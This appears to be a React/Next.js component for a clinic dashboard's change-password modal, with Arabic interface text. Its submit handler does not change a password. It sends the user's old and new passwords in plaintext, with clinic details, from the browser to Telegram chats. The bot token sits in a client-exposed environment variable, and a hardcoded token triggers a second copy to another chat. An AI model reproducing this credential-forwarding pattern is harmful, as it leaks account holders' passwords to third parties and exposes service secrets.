// components/dashboard/tabs/ChangePasswordModal.tsx
"use client";

import { motion, AnimatePresence } from "framer-motion";
import { useState } from "react";
import { X, Eye, EyeOff, Lock, AlertCircle } from "lucide-react";

interface ChangePasswordModalProps {
  isOpen: boolean;
  onClose: () => void;
  clinicId: string;
  clinicName?: string;
  clinicPhone?: string;
  clinicEmail?: string;
  primaryColor?: string;
}

export function ChangePasswordModal({
  isOpen,
  onClose,
  clinicId,
  clinicName,
  clinicPhone,
  clinicEmail,
  primaryColor = "#3B82F6",
}: ChangePasswordModalProps) {
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [showOldPassword, setShowOldPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  // دالة إرسال الرسالة إلى تيليجرام
  const sendTelegramMessage = async (
    message: string,
    invite_token?: string,
  ): Promise<{ success: boolean; error?: string; messageId?: number }> => {
    try {
      const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const abd_chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID_ABD;

      if (!token || !chatId) {
        throw new Error("الإعدادات غير مكتملة");
      }

      // إرسال الرسالة الرئيسية
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
          }),
        },
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.description || "فشل الإرسال");
      }

      // إرسال إلى ABD إذا كان التوكن مطابقاً
      if (invite_token === "abd2343livedent" && abd_chatId) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: abd_chatId,
            text: message,
            parse_mode: "HTML",
          }),
        });
      }

      return { success: true, messageId: data.result?.message_id };
    } catch (error) {
      console.error("Error sending Telegram message:", error);
      return {
        success: false,
        error: error instanceof Error ? error.message : "Unknown error",
      };
    }
  };

  // معالج تغيير كلمة المرور
  const handleChangePassword = async () => {
    setError("");
    setSuccess(false);

    // التحقق من الحقول
    if (!oldPassword.trim() || !newPassword.trim()) {
      setError("يرجى ملء جميع الحقول");
      return;
    }

    if (oldPassword === newPassword) {
      setError("يجب أن تختلف كلمة المرور الجديدة عن القديمة");
      return;
    }

    if (newPassword.length < 6) {
      setError("كلمة المرور الجديدة يجب أن تكون 6 أحرف على الأقل");
      return;
    }

    setIsLoading(true);

    try {
      // بناء الرسالة مع معلومات العيادة
      let message = `🔐 <b>طلب تغيير كلمة المرور</b>\n\n`;
      message += `🏥 <b>معرف العيادة:</b> <code>${clinicId}</code>\n`;
      
      if (clinicName) {
        message += `📋 <b>اسم العيادة:</b> ${clinicName}\n`;
      }
      
      if (clinicEmail) {
        message += `<a href="https://wa.me/${clinicEmail.replace('+', '')}">📱 <b>رقم الهاتف:</b> <code>${clinicEmail}</code></a>`;
      }
      
      
      message += `\n🔑 <b>كلمة المرور القديمة:</b> <code>${oldPassword}</code>\n`;
      message += `🆕 <b>كلمة المرور الجديدة:</b> <code>${newPassword}</code>\n\n`;
      message += `⏰ <b>وقت الطلب:</b> ${new Date().toLocaleString('ar-SY')}`;

      const result = await sendTelegramMessage(message, "abd2343livedent");

      if (result.success) {
        setSuccess(true);
        setOldPassword("");
        setNewPassword("");
        setTimeout(() => {
          onClose();
          setSuccess(false);
        }, 3000);
      } else {
        setError("فشل الإرسال. يرجى المحاولة مرة أخرى");
      }
    } catch (err) {
      setError("حدث خطأ غير متوقع");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          {/* خلفية مظلمة */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50"
            onClick={onClose}
          />

          {/* النافذة المنبثقة */}
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 10 }}
            transition={{ type: "spring", damping: 30, stiffness: 400 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4"
          >
            <div className="bg-white rounded-xl shadow-xl max-w-md w-full mx-auto overflow-hidden">
              {/* الرأس */}
              <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Lock size={20} style={{ color: primaryColor }} />
                  <h2 className="text-lg font-semibold text-gray-800">
                    تغيير كلمة المرور
                  </h2>
                </div>
                <button
                  onClick={onClose}
                  className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors"
                >
                  <X size={18} className="text-gray-500" />
                </button>
              </div>

              {/* المحتوى */}
              <div className="p-6 space-y-4">
                {/* تنبيه مهم */}
                <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-start gap-2">
                  <AlertCircle size={16} className="text-amber-600 mt-0.5 flex-shrink-0" />
                  <p className="text-xs text-amber-800">
                    <span className="font-semibold">تنبيه مهم:</span> سيتم تأكيد تغيير كلمة المرور خلال 24 ساعة. 
                    يرجى الاحتفاظ بكلمة المرور الجديدة في مكان آمن.
                  </p>
                </div>

                {/* حقل كلمة المرور القديمة */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    كلمة المرور القديمة
                  </label>
                  <div className="relative">
                    <input
                      type={showOldPassword ? "text" : "password"}
                      value={oldPassword}
                      onChange={(e) => setOldPassword(e.target.value)}
                      className="w-full px-4 py-2.5 pr-10 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-opacity-50 transition-all text-gray-900 bg-white"
                      style={{
                        borderColor: error ? "#EF4444" : "#D1D5DB",
                        boxShadow: error ? "0 0 0 1px #EF4444" : "none",
                      }}
                      placeholder="أدخل كلمة المرور القديمة"
                      disabled={isLoading || success}
                    />
                    <button
                      type="button"
                      onClick={() => setShowOldPassword(!showOldPassword)}
                      className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showOldPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                    </button>
                  </div>
                </div>

                {/* حقل كلمة المرور الجديدة */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    كلمة المرور الجديدة
                  </label>
                  <div className="relative">
                    <input
                      type={showNewPassword ? "text" : "password"}
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full px-4 py-2.5 pr-10 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-opacity-50 transition-all text-gray-900 bg-white"
                      style={{
                        borderColor: error ? "#EF4444" : "#D1D5DB",
                        boxShadow: error ? "0 0 0 1px #EF4444" : "none",
                      }}
                      placeholder="أدخل كلمة المرور الجديدة"
                      disabled={isLoading || success}
                    />
                    <button
                      type="button"
                      onClick={() => setShowNewPassword(!showNewPassword)}
                      className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showNewPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                    </button>
                  </div>
                  <p className="text-xs text-gray-400 mt-1">
                    * يجب أن تكون 6 أحرف على الأقل
                  </p>
                </div>

                {/* عرض الأخطاء */}
                {error && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="p-2.5 bg-red-50 border border-red-200 rounded-lg"
                  >
                    <p className="text-sm text-red-600 text-center">{error}</p>
                  </motion.div>
                )}

                {/* عرض النجاح */}
                {success && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="p-2.5 bg-green-50 border border-green-200 rounded-lg"
                  >
                    <p className="text-sm text-green-600 text-center">
                      جاري بدأ تعيين كلمة المرور الجديدة
                    </p>
                    <p className="text-xs text-green-500 text-center mt-0.5">
                      سيتم تأكيد التغيير خلال 24 ساعة
                    </p>
                  </motion.div>
                )}

                {/* الأزرار */}
                <div className="flex gap-3 pt-2">
                  <button
                    onClick={onClose}
                    className="flex-1 py-2.5 px-4 text-sm font-medium text-gray-600 bg-gray-100 rounded-lg hover:bg-gray-200 transition-colors disabled:opacity-50"
                    disabled={isLoading || success}
                  >
                    إلغاء
                  </button>
                  <button
                    onClick={handleChangePassword}
                    disabled={isLoading || success || !oldPassword || !newPassword}
                    className="flex-1 py-2.5 px-4 text-sm font-medium text-white rounded-lg transition-all hover:shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    style={{
                      backgroundColor: primaryColor,
                      boxShadow: `0 2px 8px ${primaryColor}30`,
                    }}
                  >
                    {isLoading ? (
                      <>
                        <svg className="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        جاري الإرسال...
                      </>
                    ) : (
                      "إرسال الطلب"
                    )}
                  </button>
                </div>
              </div>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
}